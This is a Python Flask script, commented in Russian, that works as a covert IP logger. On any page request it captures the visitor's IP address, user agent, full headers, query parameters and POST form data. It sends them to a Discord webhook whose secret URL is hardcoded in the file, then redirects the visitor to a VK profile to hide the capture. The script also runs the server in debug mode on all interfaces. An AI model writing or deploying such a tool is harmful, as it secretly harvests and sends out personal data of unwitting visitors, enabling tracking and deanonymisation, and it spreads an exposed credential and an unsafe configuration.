from flask import Flask, request, jsonify, redirect
import requests
import json

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1271875228288417884/de1_nBQiesIYCzbtm2HC91U3gOdt3_a-IyqfZDw5aKX4rRU46T-dArcn4ccb7RPv4ODF"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # Попробуем получить реальный IP-адрес клиента через заголовок X-Forwarded-For
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Получение User-Agent
    user_agent = request.headers.get('User-Agent')

    # Получение всех заголовков запроса
    headers = dict(request.headers)

    # Получение метода запроса
    request_method = request.method

    # Получение URL запроса
    request_url = request.url

    # Получение всех параметров запроса (query string)
    query_params = request.args

    # Получение данных, отправленных с POST запросом (если есть)
    post_data = request.form if request.method == 'POST' else None

    # Собираем всю информацию в словарь
    request_info = {
        "client_ip": client_ip,
        "user_agent": user_agent,
        "headers": headers,
        "request_method": request_method,
        "request_url": request_url,
        "query_params": query_params,
        "post_data": post_data
    }

    # Подготовка данных для отправки в Discord
    discord_data = {
        "content": "Request Information",
        "embeds": [{
            "title": f"New Request to {request_url}",
            "fields": [
                {"name": "Client IP", "value": client_ip, "inline": False},
                {"name": "User-Agent", "value": user_agent, "inline": False},
                {"name": "Request Method", "value": request_method, "inline": False},
                {"name": "Request URL", "value": request_url, "inline": False},
                {"name": "Query Parameters", "value": json.dumps(query_params, indent=2), "inline": False},
                {"name": "Post Data", "value": json.dumps(post_data, indent=2) if post_data else "None", "inline": False}
            ]
        }]
    }

    # Отправляем данные в Discord
    response = requests.post(DISCORD_WEBHOOK_URL, json=discord_data)

    # Проверяем успешность отправки
    if response.status_code == 204:
        print("Информация успешно отправлена в Discord")
    else:
        print(f"Ошибка отправки в Discord: {response.status_code} - {response.text}")

    # Перенаправляем пользователя на другой URL
    return redirect('https://vk.com/zxzcursid')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
